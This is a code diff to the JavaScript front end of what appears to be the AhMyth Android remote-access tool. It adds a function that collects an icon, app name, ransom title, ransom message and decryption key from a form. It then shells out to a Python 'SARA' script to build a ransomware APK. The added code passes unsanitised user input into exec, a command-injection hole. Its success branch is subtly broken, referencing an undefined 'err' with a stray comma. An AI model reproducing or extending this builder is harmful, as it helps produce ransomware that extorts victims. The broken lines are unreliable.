@@ -2,12 +2,12 @@ var app = angular.module('myapp', []);
 const { remote } = require('electron');
 var dialog = remote.dialog;
 const { ipcRenderer } = require('electron');
-var exec = require('child_process').exec;
 var fs = require('fs-extra')
 var victimsList = remote.require('./main');
 const CONSTANTS = require(__dirname + '/assets/js/Constants')
 var homeDir = require('homedir');
 var path = require("path");
+var exec = require('child_process').exec, child;
 
 //--------------------------------------------------------------
 var viclist = {};
@@ -15,6 +15,7 @@ var dataPath = path.join(homeDir(), CONSTANTS.dataDir);
 var downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
 var outputPath = path.join(dataPath, CONSTANTS.outputApkPath);
 //--------------------------------------------------------------
+
 
 
 // App Controller for (index.html)
@@ -124,6 +125,50 @@ app.controller("AppCtrl", ($scope) => {
         }
     }
 
+    // function to run python file
+
+        $appCtrl.callpy = () => {
+          $appCtrl.Log('Getting Icon from path input ', '..');
+          var iconransome = document.getElementById('icon').value
+          $appCtrl.Log('Applying APK name from input ', '..');
+          var nameransome = document.getElementById('name').value
+          $appCtrl.Log('Applying APK title from input ', '..');
+          var titleransome = document.getElementById('title').value
+          $appCtrl.Log('Inserting Ransomware title from input ', '..');
+          var descransome = document.getElementById('desc').value
+          $appCtrl.Log('Inserting Ransomware description from input ', '..');
+          var keyransome = document.getElementById('key').value
+          $appCtrl.Log('Building Ransomware APK ', '..');
+          var createRansom = exec("cd SARA && python3 sara.py "+iconransome+" "+nameransome+" "+titleransome+" "+descransome+" "+keyransome,
+            function (error, stdout, stderr) {
+               // console.log('stdout: ' + stdout);
+               // console.log('stderr: ' + stderr);
+                if (error !== null) {
+                    if (iconransome.length == 0){
+                        $appCtrl.Log('Please input the path to the PNG to be used', CONSTANTS.logStatus.FAIL);
+                        }
+                    if (nameransome.length == 0){
+                        $appCtrl.Log('Please input the name of the APK to be used', CONSTANTS.logStatus.FAIL);
+                        }
+                    if (titleransome.length == 0){
+                        $appCtrl.Log('Please Input an Encryption Message Title', CONSTANTS.logStatus.FAIL);
+                        }
+                    if (descransome.length == 0){
+                        $appCtrl.Log('Please type out the Encryption Message', CONSTANTS.logStatus.FAIL);
+                        }
+                    if (keyransome.length == 0){
+                        $appCtrl.Log('Please Input a Decryption Key', CONSTANTS.logStatus.FAIL);
+                        }
+                        $appCtrl.Log('Ransomware Build Failed', CONSTANTS.logStatus.FAIL);
+                        return;
+                        
+                    }
+                    
+                    if (err) throw err, 
+                    $appCtrl.Log('Ransomware Built Successfully ', CONSTANTS.logStatus.SUCCESS);
+                    $appCtrl.Log('The APK has been built on ' + 'AhMyth/AhMyth-Server/SARA/', CONSTANTS.logStatus.SUCCESS);
+                });
+            }
 
 
 
